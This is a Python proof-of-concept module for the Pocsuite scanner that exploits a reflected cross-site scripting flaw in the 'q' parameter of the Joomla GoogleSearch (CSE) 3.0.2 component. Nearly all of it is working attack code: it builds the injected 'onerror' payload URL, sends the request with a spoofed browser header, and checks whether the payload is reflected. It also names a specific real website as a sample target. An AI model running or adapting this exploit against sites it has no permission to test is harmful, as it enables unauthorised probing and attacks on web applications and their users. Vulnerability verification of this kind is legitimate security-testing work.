#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '1'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2015-08-29'
    createDate = '2016-01-15'
    updateDate = '2016-01-15'
    references = ['http://www.sebug.net/vuldb/ssvid-']
    name = 'joomla! 组件GoogleSearch (CSE) V3.0.2 参数q  XSS漏洞'
    appPowerLink = 'http://www.kksou.com'
    appName = 'joomla!'
    appVersion = '3.0.2'
    vulType = 'XSS漏洞'
    desc = '''
        joomla! 组件GoogleSearch (CSE)的3.0.2版本的参数q由于过滤不严，导致存在反射型XSS漏洞。
        远程攻击者可以利用该漏洞执行html代码。该漏洞验证的POC如下所示：
        http://XXX/index.php?option=com_googlesearch_cse&n=30&Itemid=97&q="><img+src=x+onerror=alert(/<0x!!qaz_*/)>
        验证的截图如下：http://pan.baidu.com/s/1i4tiZE9
    '''
    samples = ['http://ufoforce.com']

    def _attack(self):
        return self._verify()

    def _verify(self):
        #验证XSS漏洞
        result = {}
        #特征字符串
        pars='<0x!!qaz_*'
        #验证的payload
        payload='"><img+src=x+onerror=alert(/'+pars+'/)>'
        #漏洞连接
        exploit='/index.php?option=com_googlesearch_cse&n=30&Itemid=97&q='
        #构造访问地址
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #访问
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查
        if pars in resp.content:
            #漏洞验证成功
            result['VerifyInfo']={}
            result['VerifyInfo']['URL'] = self.url+exploit
            result['VerifyInfo']['Payload'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)